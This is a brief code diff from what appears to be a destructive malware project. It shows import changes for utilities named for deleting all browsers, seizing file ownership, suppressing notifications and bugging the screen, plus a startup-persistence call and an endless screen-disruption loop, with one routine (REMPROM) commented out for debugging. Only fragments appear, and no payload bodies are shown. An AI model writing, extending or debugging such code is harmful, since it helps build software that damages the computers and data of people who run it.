@@ -1,11 +1,4 @@
-from utils.getOwnerShip import getOwnerShip
-from utils.getFolderOwner import getFolderOwner
-from utils.getDesktopPath import getDesktopPath
-from utils.getDocummentsPath import getDocumentsPath
-from utils.stfuNotification import ShowFuckNotification
-from utils.screenSaverBug import makeBuggyScreen
-from utils.getFolderOwnerShip import SetOwnership
-from utils.deleteAllBrowsers import objects
+from utils.functions import *
 from src.HTTPLib import HttpClient
 from pathlib import Path
 
@@ -64,7 +57,7 @@ def add_to_startup():
 
 
 add_to_startup()
-REMPROM()
+# REMPROM() # Disabled to test if the function is provoking a bug.
 
 while True:
     makeBuggyScreen()
